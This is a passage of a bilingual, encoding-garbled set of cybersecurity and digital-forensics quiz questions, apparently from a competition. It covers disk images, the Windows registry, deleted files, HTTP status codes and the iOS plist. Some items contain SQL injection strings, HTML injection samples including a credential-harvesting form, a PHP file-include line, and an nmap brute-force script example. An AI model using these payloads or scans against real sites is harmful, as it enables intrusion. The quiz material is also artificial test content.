id="31-â€œå‚è€ƒ-â€˜-Mac-OS-img-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#31-â€œå‚è€ƒ-â€˜-Mac-OS-img-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="31    â€œå‚è€ƒ â€˜ Mac OS.img â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>31    â€œå‚è€ƒ â€˜ Mac OS.img â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Mac OS.img â€˜ file to answer below question</p><p>åœ¨ .dmg æ¡£ä¸­åˆ é™¤äº†å¤šå°‘ä¸ªæ–‡ä»¶ï¼Ÿ<br>How many files were deleted from the .dmg file?<br>â€œ    å•é€‰    A:1;B:2;C:3;D:4</p><h1 id="32-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#32-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="32    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>32    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>Elvis Chui æ€»å…±ç™»å…¥è¿‡è¯¥è®¡ç®—æœºå¤šå°‘æ¬¡?<br>According to the windows registry record of â€œâ€Window Artifacts.E01â€â€, how many times has Elvis Chui logged into this computer? </p><p>æç¤º: è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in arabic numbers<br>â€œ    å¡«ç©º    </p><h1 id="33-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#33-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="33    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>33    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>è¯¥è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿæ˜¯åœ¨å“ªä¸€ä¸ªæ—¶åŒº?<br>What is the time zone of the operating system of this computer?â€    å•é€‰    A:UTC +4;B:UTC +8;C: UTC -8;D:UTC -4</p><h1 id="34-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#34-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="34    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>34    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>è¯¥è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿäºä½•æ—¶å®‰è£…? (ä»¥è®¡ç®—æœºç³»ç»Ÿæ—¶åŒºå›ç­”)<br>When was the operating system of this computer installed? (Answer in the time zone of the computer system)â€    å•é€‰    A:2023-07-13 19:18:14;B:2023-07-13 11:18:14;C:2023-07-13 03:18:14;D:2023-07-12 19:18:14</p><h1 id="35-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#35-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="35    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>35    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>å“ª(å‡ )ä¸ªç¨‹åºä¼šäºæ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶è‡ªåŠ¨æ‰§è¡Œ?<br>Which program(s) would be automatically executed upon operating system startup?â€    å¤šé€‰    A:Avast;B:Steam;C:OneDrive;D:QQ</p><h1 id="36-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#36-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="36    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>36    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>è¯¥è®¡ç®—æœºå†…å®‰è£…äº†ä»¥ä¸‹å“ªä¸€ä¸ªç¨‹åº?<br>Which one of the following programs was installed on this computer?â€    å•é€‰    A:QQ;B:WPS Office;C:Opera;D:Kaspersky</p><h1 id="37-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#37-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="37    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>37    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>è®¡ç®—æœºå†…çš„OneDriveç¨‹åºç‰ˆæœ¬æ˜¯ä»€ä¹ˆ?<br>What is the version of the OneDrive program installed on this computer?â€    å¡«ç©º    </p><h1 id="38-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#38-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="38    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>38    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>è®¡ç®—æœºæœ‰ä¸€ä¸ªæ­£åœ¨è¿æ¥çš„ç½‘ç»œæ¥å£ï¼Œè¯¥æ¥å£è¿æ¥DHCPæœåŠ¡å™¨çš„IPåœ°å€æ˜¯å¤šå°‘?<br>What is the IP address of DHCP server. ?</p><p>æç¤º: ä»¥ IPV4æ ¼å¼å›ç­”<br>Answer: Please answer in IPV4 format.â€    å¡«ç©º    </p><h1 id="39-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#39-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å†…çš„Windows-æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="39    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>39    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å†…çš„Windows æ³¨å†Œè¡¨å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>è¯¥è®¡ç®—æœºä½•æ—¶è¿æ¥è¿‡ä¸€åªUç›˜? (ä»¥è®¡ç®—æœºç³»ç»Ÿæ—¶åŒºå›ç­”)<br>When was a USB flash drive last connected to this computer? (Answer in the time zone of the computer system)â€    å•é€‰    A:2023-07-13 11:48:26;B:2023-07-13 03:48:29;C:2023-07-12 19:48:29;D:2023-07-13 11:48:29</p><h1 id="40-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#40-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="40    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>40    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>Elvis Chui å°†å“ªå‡ ä¸ªæ–‡æœ¬æ–‡ä»¶æ”¾åœ¨å›æ”¶ç«™ä¸­?<br>Which text files did Elvis Chui put into the recycle bin?<br>â€œ    å¤šé€‰    A:$+D10I76A74P.txt;B:Holiday schedule 2023-07-16.txt;C:Holiday schedule 2023-07-13.txt;D:Minute on 2023-07-01.txt;E: Minute on 2023-07-10.txt</p><h1 id="41-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#41-â€œå‚è€ƒâ€™-Window-Artifacts-E01-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="41    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>41    â€œå‚è€ƒâ€™ Window Artifacts.E01 â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>Elvis Chuiåœ¨ä»€ä¹ˆæ—¶é—´åˆ é™¤äº†ç¬¬ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶? (ä»¥è®¡ç®—æœºç³»ç»Ÿæ—¶åŒºå›ç­”)<br>What time did Elvis Chui delete the first text file? (Answer in the time zone of the computer system)<br>â€œ    å•é€‰    A:2023-07-13 11:50:15;B:2023-07-13 03:49:45;C:2023-07-13 03:50:15;D:2023-07-13 11:49:45</p><h1 id="42-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#42-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="42    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>42    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>Elvis Chuiåˆ é™¤çš„ç¬¬ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶çš„æ–‡ä»¶åæ˜¯ä»€ä¹ˆ?<br>What was the name of the first text file Elvis Chui deleted?</p><p>æç¤º: è¯·ç”¨å°å†™å­—æ¯å›ç­”åŠéœ€åˆ—æ˜æ–‡ä»¶æ ¼å¼ã€‚å¦‚æ–‡ä»¶åå­—å†…æœ‰ç©ºæ ¼ä½ç½®ï¼Œè¯·ç”¨<em>æ ‡ç¤ºã€‚ä¾‹å¦‚: go_to_school.docx<br>Tips: Please use  lowercase to answer the questions and mention the file extension.  If a blank space is present, please use </em> to represent the blank space.  Example: go_to_school.docxâ€    å¡«ç©º    </p><h1 id="43-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#43-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="43    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>43    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>Elvis Chuiåˆ é™¤çš„ç¬¬ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶åœ¨ä»€ä¹ˆæ—¶é—´åˆ›å»º? (ä»¥è®¡ç®—æœºç³»ç»Ÿæ—¶åŒºå›ç­”)<br>When was the text file first deleted by Elvis was created? (Answer in the time zone of the computer system)</p><p>â€œ    å•é€‰    A:2023-07-13_11:42:39;B:2023-07-13_11:50:49;C:2023-07-13_11:49:45;D:2023-07-13_11:45:22</p><h1 id="44-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#44-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="44    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>44    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>Elvis Chuiè®¡åˆ’äº2023å¹´7æœˆ15æ—¥20ç‚¹5åˆ†æœ‰ä»€ä¹ˆæ´»åŠ¨?<br>What is Elvis Chuiâ€™s plan at 8:05 PM on July 15, 2023?</p><p>æç¤º: ç­”æ¡ˆè¯·ä¸æ–‡ä»¶å†…çš„æ–‡å­—ä¸å¤§ç»†é˜¶ç›¸åŒ<br>Tips: Please answer the exact words and uppercase/lowercase leters shown in the fileâ€    å¡«ç©º    </p><h1 id="45-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#45-â€œå‚è€ƒ-â€˜-Window-Artifacts-E01-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="45    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>45    â€œå‚è€ƒ â€˜ Window Artifacts.E01 â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Window Artifacts.E01 â€˜ file to answer below question</p><p>è¯¥è®¡ç®—æœºæ‰§è¡ŒSTEAM.EXEæ€»å…±å¤šå°‘æ¬¡?<br>How many times has STEAM.EXE been opened on this computer?</p><p>æç¤º: è¯·ç”¨é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in arabic numbers</p><p>â€œ    å¡«ç©º    </p><h1 id="46-â€œä¸€ä¸ªåä¸ºâ€œAccountâ€çš„æ•°æ®åº“è¡¨æ‹¥æœ‰5ä¸ªâ€â€åˆ—â€â€ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤ä¼šäº§ç”Ÿé”™è¯¯è®¯æ¯"><a href="#46-â€œä¸€ä¸ªåä¸ºâ€œAccountâ€çš„æ•°æ®åº“è¡¨æ‹¥æœ‰5ä¸ªâ€â€åˆ—â€â€ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤ä¼šäº§ç”Ÿé”™è¯¯è®¯æ¯" class="headerlink" title="46    â€œä¸€ä¸ªåä¸ºâ€œAccountâ€çš„æ•°æ®åº“è¡¨æ‹¥æœ‰5ä¸ªâ€â€åˆ—â€â€ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤ä¼šäº§ç”Ÿé”™è¯¯è®¯æ¯?"></a>46    â€œä¸€ä¸ªåä¸ºâ€œAccountâ€çš„æ•°æ®åº“è¡¨æ‹¥æœ‰5ä¸ªâ€â€åˆ—â€â€ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤ä¼šäº§ç”Ÿé”™è¯¯è®¯æ¯?</h1><p>(æç¤º: 1.æ•°æ®åº“æ˜¯æ‹¥æœ‰æ­£å¸¸é»˜è®¤çš„ç³»ç»Ÿè¡¨æ ¼ 2.é”™è¯¯ä¿¡æ¯æ˜¯å…³äºâ€â€è¶…å‡ºä¸Šé™â€â€çš„é”™è¯¯)<br>A database table called â€œAccountâ€ has 5 columns. Which of the following command will case an error message?<br>(Tips 1. database has default system tables 2. error message is related to â€œâ€Out of Rangeâ€â€.)<br>â€œ    å•é€‰    A:SELECT <em> from Account WHERE name=â€˜Alexâ€™ OR â€˜1â€™=1;B:SELECT </em> FROM Account WHERE name=â€˜Billâ€™ UNION SELECT NULL, NULL, NULL, NULL; â€”;C:SELECT * from Account WHERE name=â€˜Candyâ€™ ORDER BY 6; â€”;D:SELECT name FROM sys.tables</p><h1 id="47-â€œå½“å®¢æˆ·ç«¯æ”¶åˆ°ä¸€ä¸ªé¡µé¢è¯·æ±‚çš„HTTPçŠ¶æ€ä»£ç ä¸º304æ—¶ï¼Œä»¥ä¸‹å“ªç§æƒ…å†µæœ€æœ‰å¯èƒ½å‘ç”Ÿï¼Ÿ"><a href="#47-â€œå½“å®¢æˆ·ç«¯æ”¶åˆ°ä¸€ä¸ªé¡µé¢è¯·æ±‚çš„HTTPçŠ¶æ€ä»£ç ä¸º304æ—¶ï¼Œä»¥ä¸‹å“ªç§æƒ…å†µæœ€æœ‰å¯èƒ½å‘ç”Ÿï¼Ÿ" class="headerlink" title="47    â€œå½“å®¢æˆ·ç«¯æ”¶åˆ°ä¸€ä¸ªé¡µé¢è¯·æ±‚çš„HTTPçŠ¶æ€ä»£ç ä¸º304æ—¶ï¼Œä»¥ä¸‹å“ªç§æƒ…å†µæœ€æœ‰å¯èƒ½å‘ç”Ÿï¼Ÿ"></a>47    â€œå½“å®¢æˆ·ç«¯æ”¶åˆ°ä¸€ä¸ªé¡µé¢è¯·æ±‚çš„HTTPçŠ¶æ€ä»£ç ä¸º304æ—¶ï¼Œä»¥ä¸‹å“ªç§æƒ…å†µæœ€æœ‰å¯èƒ½å‘ç”Ÿï¼Ÿ</h1><p>When a client receives an HTTP Status Code of 304 for a page request, which of the following is most likely to take place?<br>â€œ    å•é€‰    â€œAï¼šé¡µé¢å°†æ˜¾ç¤ºé”™è¯¯The page will display with errors;Bï¼šé¡µé¢å°†ä»æµè§ˆå™¨ç¼“å­˜ä¸­åŠ è½½The page will be loaded from the browser cache;Cï¼šæµè§ˆå™¨å°†æ˜¾ç¤ºâ€œè®¿é—®è¢«æ‹’ç»â€The browser will display an â€œAccess Deniedâ€;Dï¼šæœåŠ¡å™¨å°†å¤ä½å‘å®¢æˆ·ç«¯åˆ°å¦ä¸€ä¸ªèµ„æºThe server will redirect the client to another resource<br>â€œ</p><h1 id="48-â€œåœ¨HTMLæ³¨å…¥æ”»å‡»ä¸­ï¼Œä»¥ä¸‹å“ªç§æƒ…å†µæœ€æœ‰å¯èƒ½å‡ºç°ï¼Ÿ"><a href="#48-â€œåœ¨HTMLæ³¨å…¥æ”»å‡»ä¸­ï¼Œä»¥ä¸‹å“ªç§æƒ…å†µæœ€æœ‰å¯èƒ½å‡ºç°ï¼Ÿ" class="headerlink" title="48    â€œåœ¨HTMLæ³¨å…¥æ”»å‡»ä¸­ï¼Œä»¥ä¸‹å“ªç§æƒ…å†µæœ€æœ‰å¯èƒ½å‡ºç°ï¼Ÿ"></a>48    â€œåœ¨HTMLæ³¨å…¥æ”»å‡»ä¸­ï¼Œä»¥ä¸‹å“ªç§æƒ…å†µæœ€æœ‰å¯èƒ½å‡ºç°ï¼Ÿ</h1><p>Which of the following would most likely be found in an HTML Injection attack?<br>â€œ    å•é€‰    â€œA: <form action=â€œhttp://1.2.3.4/login.htmâ€>Password:<input type=â€œpasswordâ€ name=â€œpwordâ€> </form>;B:<embed src=â€œhttp://demo.com/demo.swfâ€> </embed>;C: <script>alert(â€˜Correctâ€™)</script>;D: &lt;?php include(â€œinc/â€ .$_GET[â€˜fileâ€™];?&gt;<br>â€œ</p><h1 id="49-â€œå¦‚ä½•é¢„é˜²HTMLæ³¨å…¥æ”»å‡»ï¼Ÿ"><a href="#49-â€œå¦‚ä½•é¢„é˜²HTMLæ³¨å…¥æ”»å‡»ï¼Ÿ" class="headerlink" title="49    â€œå¦‚ä½•é¢„é˜²HTMLæ³¨å…¥æ”»å‡»ï¼Ÿ"></a>49    â€œå¦‚ä½•é¢„é˜²HTMLæ³¨å…¥æ”»å‡»ï¼Ÿ</h1><p>How to prevent HTML injection attacks?<br>â€œ    å•é€‰    â€œA:å¯†é’¥ç®¡ç†Key management;<br>B:åŒæºç­–ç•¥æ‰§è¡ŒSame Origin<br>Policy enforcement;C:ä¼šè¯éªŒè¯Session validation;D:è¾“å…¥è¿‡æ»¤Input sanitization<br>â€œ</p><h1 id="50-â€œåŒæºç­–ç•¥åœ¨æµè§ˆå™¨å†…å­˜ä¸­æä¾›Webåº”ç”¨ç¨‹åºå®‰å…¨çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#50-â€œåŒæºç­–ç•¥åœ¨æµè§ˆå™¨å†…å­˜ä¸­æä¾›Webåº”ç”¨ç¨‹åºå®‰å…¨çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="50    â€œåŒæºç­–ç•¥åœ¨æµè§ˆå™¨å†…å­˜ä¸­æä¾›Webåº”ç”¨ç¨‹åºå®‰å…¨çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ"></a>50    â€œåŒæºç­–ç•¥åœ¨æµè§ˆå™¨å†…å­˜ä¸­æä¾›Webåº”ç”¨ç¨‹åºå®‰å…¨çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>What is the purpose of Same-Origin Policy in providing web application security in a browserâ€™s memory?<br>â€œ    å•é€‰    â€œA:é˜²æ­¢å®¢æˆ·ç«¯è®¿é—®æ¶æ„ç½‘ç«™Preventing the client from accessing a malicious site;B:ç¦æ­¢Webä¼šè¯è¿è¡Œå¤–éƒ¨è„šæœ¬Prohibiting a web session from running externally sourced scripts;C:æ§åˆ¶æ¥è‡ªä¸åŒæœåŠ¡å™¨çš„ä»£ç ä¹‹é—´çš„äº¤äº’Controlling interactions between code from different servers;D:é˜»æ­¢æµè§ˆå™¨è¿è¡Œå±é™©æˆ–æœ‰å®³çš„è„šæœ¬Stopping a browser from running dangerous or harmful scripts<br>â€œ</p><h1 id="51-â€œç¼–å†™Nmapå‘½ä»¤ä»¥æ˜¾ç¤ºä»¥ä¸‹ç»“æœã€‚"><a href="#51-â€œç¼–å†™Nmapå‘½ä»¤ä»¥æ˜¾ç¤ºä»¥ä¸‹ç»“æœã€‚" class="headerlink" title="51    â€œç¼–å†™Nmapå‘½ä»¤ä»¥æ˜¾ç¤ºä»¥ä¸‹ç»“æœã€‚"></a>51    â€œç¼–å†™Nmapå‘½ä»¤ä»¥æ˜¾ç¤ºä»¥ä¸‹ç»“æœã€‚</h1><p>Write the Namp command that will show the following result</p><p>Starting Nmap 7.94 (<a href="https://nmap.org">https://nmap.org</a>) at 2023-07-11 18:26 ä¸­å›½æ ‡å‡†æ—¶é—´<br>Nmap scan report for www.baidu.com (220.181.38.149)<br>Host is up (0.044s latency).<br>Other addresses for www.baidu.com (not scanned): 220.181.38.150</p><p>Not shown: 998 filtered tcp ports (no-response)<br>PORT          STATE            SERVICE<br>80/tcp           open                http<br>|  http-robots.txt: 10 disallowed entries<br>|  /baidu /s? /ulink? /link? /home/news/data/  /bh /shifen/<br>|<em>/homepage/  /cpro /<br>443/tcp     open             https<br>|  http-robots.txt: 10 disallowed entries<br>|  /baidu /s? /ulink? /link? /home/news/data/  /bh /shifen/<br>|</em>/homepage/  /cpro /</p><p>Nmap done: 1 IP address (1 host up) scanned in 6.01 seconds</p><p>æç¤º:è¯·è¾“å…¥å®Œæ•´çš„NmapæŒ‡ä»¤ï¼Œä¾‹å¦‚: nmap â€”script http-brute -p 80 www.google.com<br>Tips: Please input the complete nmap command.  Example: nmap â€”script http-brute -p 80 www.google.comâ€    å¡«ç©º    </p><h1 id="52-â€œé™¤äº†ä½¿ç”¨Nmapï¼Œè¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥éªŒè¯ä¸Šè¿°ç»“æœï¼Œå…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨Webæµè§ˆå™¨æµè§ˆURLï¼Œç¼–å†™URLä»¥æ˜¾ç¤ºä¸Šè¿°ç»“æœã€‚ï¼ˆç­”æ¡ˆä¸è¦åŒ…å«â€œhttp-â€ï¼‰"><a href="#52-â€œé™¤äº†ä½¿ç”¨Nmapï¼Œè¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥éªŒè¯ä¸Šè¿°ç»“æœï¼Œå…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨Webæµè§ˆå™¨æµè§ˆURLï¼Œç¼–å†™URLä»¥æ˜¾ç¤ºä¸Šè¿°ç»“æœã€‚ï¼ˆç­”æ¡ˆä¸è¦åŒ…å«â€œhttp-â€ï¼‰" class="headerlink" title="52    â€œé™¤äº†ä½¿ç”¨Nmapï¼Œè¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥éªŒè¯ä¸Šè¿°ç»“æœï¼Œå…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨Webæµè§ˆå™¨æµè§ˆURLï¼Œç¼–å†™URLä»¥æ˜¾ç¤ºä¸Šè¿°ç»“æœã€‚ï¼ˆç­”æ¡ˆä¸è¦åŒ…å«â€œhttp://â€ï¼‰"></a>52    â€œé™¤äº†ä½¿ç”¨Nmapï¼Œè¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥éªŒè¯ä¸Šè¿°ç»“æœï¼Œå…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨Webæµè§ˆå™¨æµè§ˆURLï¼Œç¼–å†™URLä»¥æ˜¾ç¤ºä¸Šè¿°ç»“æœã€‚ï¼ˆç­”æ¡ˆä¸è¦åŒ…å«â€œ<a href="http://â€ï¼‰">http://â€ï¼‰</a></h1><p>Other than using Nmap, there are other methods which can verify the above result. One of the methods is using Web browser to surf the URL. Write the URL that will show the above result.<br>(Answer without â€œhttp://â€)<br>â€œ    å¡«ç©º    </p><h1 id="53-â€œå‚è€ƒâ€™-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#53-â€œå‚è€ƒâ€™-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="53    â€œå‚è€ƒâ€™ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>53    â€œå‚è€ƒâ€™ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ to answer below question</p><p>æ ¹æ® â€˜ com.apple.ios.StoreKitUIService.plist â€˜ , è¿™éƒ¨ç”µè¯æ˜¯ä»€ä¹ˆå‹å·?<br>According to â€˜ com.apple.ios.StoreKitUIService.plist â€˜, what is the model of this phone?â€    å•é€‰    A:SAMSUNG S23;B:iPhone X;C:iPhone XR;D:iPhone XS;E:iPhone 13</p><h1 id="54-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#54-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="54    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>54    â€œå‚è€ƒ â€˜ IOS â€˜ 